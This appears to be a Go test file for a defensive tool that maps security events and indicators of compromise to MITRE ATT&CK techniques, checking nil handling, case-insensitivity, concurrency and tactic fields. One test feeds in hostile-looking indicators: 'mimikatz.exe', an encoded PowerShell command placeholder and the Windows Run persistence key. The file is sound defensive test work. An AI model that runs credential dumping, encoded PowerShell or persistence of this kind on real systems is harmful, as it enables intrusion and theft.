func TestMapEvent_NilDataNoError(t *testing.T) {
	af := newTestFramework()
	ctx := context.Background()
	eventTypes := []string{
		"process_creation",
		"file_creation",
		"registry_modification",
		"network_connection",
		"authentication_failure",
		"privilege_escalation",
	}
	for _, et := range eventTypes {
		_, err := af.MapEvent(ctx, et, nil)
		if err != nil {
			t.Errorf("MapEvent(%q, nil): unexpected error: %v", et, err)
		}
	}
}

// TestMapEvent_CaseInsensitiveEventType verifies that event type matching is
// case-insensitive.
func TestMapEvent_CaseInsensitiveEventType(t *testing.T) {
	af := newTestFramework()
	ctx := context.Background()

	cases := []struct {
		eventType string
		data      map[string]interface{}
	}{
		{"AUTHENTICATION_FAILURE", map[string]interface{}{}},
		{"Network_Connection", map[string]interface{}{}},
		{"PRIVILEGE_ESCALATION", map[string]interface{}{}},
	}
	for _, tc := range cases {
		mappings, err := af.MapEvent(ctx, tc.eventType, tc.data)
		if err != nil {
			t.Errorf("MapEvent(%q): unexpected error: %v", tc.eventType, err)
			continue
		}
		if len(mappings) == 0 {
			t.Errorf("MapEvent(%q): expected mappings for case-insensitive event type", tc.eventType)
		}
	}
}

// =============================================================================
// Concurrency Tests
// =============================================================================

// TestGetTechnique_Concurrent verifies the RWMutex prevents data races when
// multiple goroutines read concurrently.
func TestGetTechnique_Concurrent(t *testing.T) {
	af := newTestFramework()
	done := make(chan struct{}, 50)
	for i := 0; i < 50; i++ {
		go func() {
			af.GetTechnique("T1059")
			af.GetTechnique("T1003")
			done <- struct{}{}
		}()
	}
	for i := 0; i < 50; i++ {
		<-done
	}
}

// TestGetTechniquesByTactic_Concurrent verifies iteration over the map is
// race-free under concurrent access.
func TestGetTechniquesByTactic_Concurrent(t *testing.T) {
	af := newTestFramework()
	done := make(chan struct{}, 20)
	for i := 0; i < 20; i++ {
		go func() {
			af.GetTechniquesByTactic("execution")
			done <- struct{}{}
		}()
	}
	for i := 0; i < 20; i++ {
		<-done
	}
}

// =============================================================================
// Mapping Field Integrity Tests
// =============================================================================

// TestMapIOC_TacticFieldsPopulated verifies that TacticID and TacticName are
// non-empty on all returned mappings.
func TestMapIOC_TacticFieldsPopulated(t *testing.T) {
	af := newTestFramework()
	ctx := context.Background()

	inputs := []struct {
		iocType string
		value   string
	}{
		{"ip", "1.2.3.4"},
		{"domain", "api.github.com"},
		{"hash", "abc123"},
		{"file", "mimikatz.exe"},
		{"process", "powershell.exe -enc abc"},
		{"registry", `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`},
	}
	for _, inp := range inputs {
		mappings, _ := af.MapIOC(ctx, inp.iocType, inp.value)
		for _, m := range mappings {
			if m.TacticID == "" {
				t.Errorf("MapIOC(%q, %q): mapping %s has empty TacticID",
					inp.iocType, inp.value, m.TechniqueID)
			}
			if m.TacticName == "" {
				t.Errorf("MapIOC(%q, %q): mapping %s has empty TacticName",
					inp.iocType, inp.value, m.TechniqueID)
			}
		}
	}
}

// =============================================================================
// Helpers
// =============================================================================

// techIDs converts a slice of Mapping to a set of TechniqueIDs for easy
// membership tests.
func techIDs(mappings []Mapping) map[string]bool {
	out := make(map[string]bool, len(mappings))
	for _, m := range mappings {
		out[m.TechniqueID] = true
	}
	return out
}
